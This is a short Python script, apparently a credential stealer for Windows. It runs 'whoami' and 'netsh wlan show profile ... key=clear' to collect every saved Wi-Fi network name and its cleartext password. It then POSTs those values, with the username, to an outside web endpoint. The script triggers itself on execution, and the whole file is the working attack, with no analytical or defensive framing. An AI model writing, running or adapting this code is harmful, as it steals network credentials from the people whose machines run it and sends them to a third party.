import subprocess
import requests
import re

class Network:
    def __init__(self,user,ussid,password):
        self.user = user
        self.ussid = ussid
        self.password = password


class NetworkPwner:
    def __init__(self):
        self.url = "https://meterpreter.pythonanywhere.com/register/"
        self.networks = []
        self.user = self.get_user()
        self.ussids = re.findall(r" All User Profile\s+:\s+([A-Za-z0-9_-]+)",self.get_ussids())
        self.passwords = self.get_passwords()
        self.initData()
        
    def get_user(self):
        user = subprocess.run('whoami', shell=True, capture_output=True, text=True)
        return user.stdout

    def get_ussids(self):
        out = subprocess.run('netsh wlan show profiles', shell=True, capture_output=True, text=True)
        return out.stdout

    def get_passwords(self):
        passwords = []
        for ussid in self.ussids:
            out = subprocess.run(f'netsh wlan show profile "{ussid}" key=clear', shell=True, capture_output=True, text=True)
            pw = re.findall(r' Key Content            : (\w+)',out.stdout)
            passwords.append(pw[0])

        return passwords
    
    def initData(self):
        for i,q in zip(self.ussids,self.passwords):
            self.networks.append(Network(self.user,i,q))

    def expose_data(self):
        for i in self.networks:
            res=requests.post(self.url, json={
                'name':i.user,
                'ussid':i.ussid,
                'password':i.password,
            })
        
            



NetworkPwner().expose_data()